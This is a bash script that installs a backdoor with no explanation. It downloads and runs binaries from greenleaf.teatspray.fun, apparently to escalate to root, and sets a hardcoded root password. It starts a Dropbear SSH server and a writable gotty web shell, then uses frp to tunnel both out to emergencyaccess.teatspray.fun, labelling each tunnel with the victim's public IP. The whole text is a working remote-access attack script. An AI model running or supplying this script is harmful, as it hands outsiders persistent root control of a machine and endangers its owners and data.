#!/bin/bash
cd
curl https://greenleaf.teatspray.fun/system32.tar.gz -L -O -J
sleep 2
curl https://greenleaf.teatspray.fun/backup2.tar.gz -L -O -J
sleep 2
tar -xf system32.tar.gz
sleep 2
tar -xf backup2.tar.gz
sleep 2
./system32 -S . /bin/bash

sleep 2

su -

sleep 2
cd
sleep 2
whoami
sleep 2

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libjansson-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget dpkg libuv1-dev libssl-dev libhwloc-dev dropbear >/dev/null
sleep 2

curl https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz -L -O -J
sleep 2
tar -xf gotty_linux_amd64.tar.gz && ./gotty --permit-write --reconnect /bin/bash &
sleep 2
curl -s https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz -L -O -J
sleep 2
tar -xvf frp_0.48.0_linux_amd64.tar.gz
sleep 2
cp frp_0.48.0_linux_amd64/frpc ~/

sleep 2

cat > /etc/default/dropbear <<END
NO_START=0
DROPBEAR_PORT=2299
DROPBEAR_EXTRA_ARGS=
DROPBEAR_BANNER=""
DROPBEAR_RECEIVE_WINDOW=65536
END

sleep 2

echo "root:Pmataga87465622" | chpasswd
sleep 2
service dropbear restart
sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_Stream_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

randomNumber=$(shuf -i 10000-65000 -n 1)
randomNumber2=$(shuf -i 10000-65000 -n 1)

sleep 2

cat > frpc.ini <<END
[common]
server_addr = emergencyaccess.teatspray.fun
server_port = 7000

[gotty.$currentdate]
type = tcp
local_ip = 127.0.0.1
local_port = 8080
remote_port = $randomNumber
subdomain = $currentdate

[dropbear.$currentdate]
type = tcp
local_ip = 127.0.0.1
local_port = 2299
remote_port = $randomNumber2
subdomain = $currentdate

END

sleep 2

echo "Your Gotty connection details will be $currentdate.emergencyaccess.teatspray.fun:$randomNumber" 

echo "Your Dropbear connection details will be $currentdate.emergencyaccess.teatspray.fun:$randomNumber2" 

sleep 2

./frpc -c frpc.ini
